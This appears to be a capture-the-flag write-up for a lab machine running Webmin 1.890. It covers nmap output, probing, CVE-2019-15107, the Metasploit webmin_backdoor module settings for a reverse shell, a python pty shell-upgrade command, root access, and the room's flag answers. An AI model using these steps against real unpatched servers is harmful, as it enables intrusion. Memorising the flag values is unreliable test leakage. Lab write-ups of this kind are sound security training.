# Source

## description

Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

## Data

IP address = `10.10.216.185`

The tool is Webmin, a web-based system config tool

## NMAP

```bash
# Nmap 7.92 scan initiated Sat Jun 11 12:43:56 2022 as: nmap -sV -oN nmap.txt --allports 10.10.216.185
Nmap scan report for 10.10.216.185
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 11 12:44:35 2022 -- 1 IP address (1 host up) scanned in 38.70 seconds
```

## Probing

### Http
Accessing the machine on http, we get an error:

```
Error - Document follows
This web server is running in SSL mode. Try the URL https://ip-10-10-216-185.eu-west-1.compute.internal:10000/ instead.
```
-> This url has no dns

### Cookies

The /session_login.cgi has a `testing` cookie with the value to 1. If set to 0 (ex. true), then we get an error: 

```
Error - No cookies
Your browser does not support cookies, which are required for this web server to work in session authentication mode
```

### Enumerating webpages

nothing shows

### CVE-2019-15107

https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search

Metasploit added an exploit to their database

## Metasploit

Exploit: `linux/http/webmin_backdoor`

RHOST = IP
RPORT = 10000
SSL = true
LHOST = attack ip

This created a shell, but it needed to be stabelized.


We used the python interactive shell to spawn a bash shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

We are immediately logged in as root

## Flags

`/home/dark/user.txt` = `THM{SUPPLY_CHAIN_COMPROMISE}`

`/root` = `THM{UPDATE_YOUR_INSTALL}`




